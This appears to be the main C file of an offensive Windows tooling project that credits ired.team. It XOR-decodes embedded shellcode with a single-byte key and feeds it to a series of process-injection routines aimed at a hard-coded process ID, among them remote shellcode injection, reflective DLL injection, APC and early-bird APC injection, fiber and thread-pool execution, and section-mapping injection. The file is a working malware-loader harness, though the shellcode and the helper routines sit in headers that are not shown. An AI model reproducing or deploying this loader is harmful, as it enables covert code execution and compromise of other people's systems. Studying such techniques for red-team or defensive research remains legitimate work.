#include <stdio.h>
#include "Techniques.h"
#include "AsmCodes.h"

//
// The techniques mentioned in this project are all derived from: https://www.ired.team
//

void decodeBuffer(unsigned char* outputBuffer, int bufferLen, unsigned char key) {

	unsigned char* encoded_shellcode = (unsigned char*)SHELLCODE;

	for (int i = 0; i < bufferLen; i++) {
		outputBuffer[i] = (encoded_shellcode[i] ^ key); // XOR operation to decode
	}
}


int main()
{
	UINT32 TargetProcessId = 0x1c0;

	// Key to decode with
	unsigned char key = 'A';


	int arrayLen = sizeof(SHELLCODE);

	unsigned char* outputBuffer = (unsigned char*)malloc(arrayLen);

	if (outputBuffer == NULL) {
		fprintf(stderr, "Memory allocation failed.\n");
		exit(EXIT_FAILURE);
	}

	// Decode the shellcode and store it in a buffer
	decodeBuffer(outputBuffer, arrayLen, key);

	// Now you have the decoded shellcode in the buffer
	// You can use the buffer and buffer_size as needed
	InjectShellcodeRemoteProcess(TargetProcessId, outputBuffer, arrayLen);
	DllInjectionRemoteProcess(TargetProcessId);
	ReflectiveDllInjection();
	RunFromPeResources();
	ApcQueueCodeInjection();
	EarlyBirdApcQueueInjection();
	ExecuteModuleShellcodeUsingFiber();
	ModuleExecutionThroughThreadPool();
	MapViewOfSectionCodeInjection(TargetProcessId);

	// Free the allocated buffer when done
	free(outputBuffer);

}
